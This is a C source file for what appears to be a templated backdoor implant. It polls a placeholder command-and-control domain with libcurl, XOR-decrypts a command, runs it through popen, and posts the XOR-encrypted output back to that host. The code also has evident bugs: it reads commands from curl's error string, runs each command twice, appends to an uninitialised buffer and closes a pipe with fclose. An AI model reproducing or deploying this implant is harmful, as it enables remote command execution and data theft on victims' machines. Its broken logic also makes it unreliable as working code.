#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

#define DOMAIN "{Domain}"
#define KEY "{Key}"

char *encrypt(char *data, char *key) {
    int data_len = strlen(data);
    int key_len = strlen(key);
    char *encrypted = (char *)malloc(data_len+1);
    for (int i = 0; i < data_len; i++) {
        encrypted[i] = data[i] ^ key[i%key_len];
    }
    encrypted[data_len] = '\0';
    return encrypted;
}

char *decrypt(char *encrypted, char *key) {
    int data_len = strlen(encrypted);
    int key_len = strlen(key);
    char *decrypted = (char *)malloc(data_len+1);
    for (int i = 0; i < data_len; i++) {
        decrypted[i] = encrypted[i] ^ key[i%key_len];
    }
    decrypted[data_len] = '\0';
    return decrypted;
}

int main() {
    CURL *curl;
    CURLcode res;
    char *raw_cmd, *cmd, *data, *encoded, *post_output;
    while(1) {
        curl_global_init(CURL_GLOBAL_ALL);
        curl = curl_easy_init();
        if (curl) {
            curl_easy_setopt(curl, CURLOPT_URL, DOMAIN);
            curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, fwrite);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, stdout);
            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                curl_easy_cleanup(curl);
                break;
            }
            raw_cmd = strdup(curl_easy_strerror(res));
            cmd = (char *)decrypt(raw_cmd, KEY);
            if (strstr(cmd, "Closed")) {
                curl_easy_cleanup(curl);
                break;
            }
            FILE *fp;
            fp = popen(cmd, "r");
            if (fp == NULL) {
                cmd = "Error";
            }
            else {
                char buffer[1024];
                size_t len = 0;
                while (fgets(buffer, sizeof(buffer), fp) != NULL) {
                    len += strlen(buffer);
                }
                pclose(fp);
                data = (char *)malloc(len+1);
                fp = popen(cmd, "r");
                while (fgets(buffer, sizeof(buffer), fp) != NULL) {
                    strcat(data, buffer);
                }
                fclose(fp);
                encoded = (char *)encrypt(data, KEY);
                curl_easy_setopt(curl, CURLOPT_POSTFIELDS, encoded);
                res = curl_easy_perform(curl);
                if (res != CURLE_OK) {
                    curl_easy_cleanup(curl);
                    break;
                }
                post_output = strdup(curl_easy_strerror(res));
            }
            curl_easy_cleanup(curl);
        }
        curl_global_cleanup();
    }
    return 0;
}
